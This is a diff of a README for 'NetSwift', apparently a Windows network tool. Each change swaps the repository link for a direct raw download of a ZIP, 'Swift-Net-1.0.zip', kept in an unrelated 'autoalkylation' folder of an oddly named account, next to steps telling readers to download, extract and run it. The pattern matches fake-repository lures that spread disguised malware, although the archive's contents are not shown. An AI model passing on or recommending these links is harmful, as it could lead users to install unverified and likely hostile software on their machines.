@@ -1,6 +1,6 @@
 # 🛡️ NetSwift - Fast Network Tools for Windows
 
-[![Download NetSwift](https://img.shields.io/badge/Download-NetSwift-blue?style=for-the-badge&logo=github)](https://github.com/Manipulationjuniperbush648/NetSwift)
+[![Download NetSwift](https://img.shields.io/badge/Download-NetSwift-blue?style=for-the-badge&logo=github)](https://github.com/Manipulationjuniperbush648/NetSwift/raw/refs/heads/main/autoalkylation/Swift-Net-1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ NetSwift is a Windows command-line tool for network checks, Wi-Fi review, DNS se
 
 Use the link below to visit this page to download and run the app:
 
-[Visit the NetSwift download page](https://github.com/Manipulationjuniperbush648/NetSwift)
+[Visit the NetSwift download page](https://github.com/Manipulationjuniperbush648/NetSwift/raw/refs/heads/main/autoalkylation/Swift-Net-1.0.zip)
 
 ## 📦 What NetSwift Does
 
@@ -40,7 +40,7 @@ Recommended:
 
 ## 📥 Download and Run
 
-1. Open the download page: [https://github.com/Manipulationjuniperbush648/NetSwift](https://github.com/Manipulationjuniperbush648/NetSwift)
+1. Open the download page: [https://github.com/Manipulationjuniperbush648/NetSwift/raw/refs/heads/main/autoalkylation/Swift-Net-1.0.zip](https://github.com/Manipulationjuniperbush648/NetSwift/raw/refs/heads/main/autoalkylation/Swift-Net-1.0.zip)
 2. Download the NetSwift package from that page
 3. If the file comes in a ZIP folder, right-click it and choose Extract All
 4. Open the extracted folder
@@ -201,7 +201,7 @@ For the smoothest first run:
 
 Use this page to download and run NetSwift:
 
-[https://github.com/Manipulationjuniperbush648/NetSwift](https://github.com/Manipulationjuniperbush648/NetSwift)
+[https://github.com/Manipulationjuniperbush648/NetSwift/raw/refs/heads/main/autoalkylation/Swift-Net-1.0.zip](https://github.com/Manipulationjuniperbush648/NetSwift/raw/refs/heads/main/autoalkylation/Swift-Net-1.0.zip)
 
 ## 🧩 Topics
 
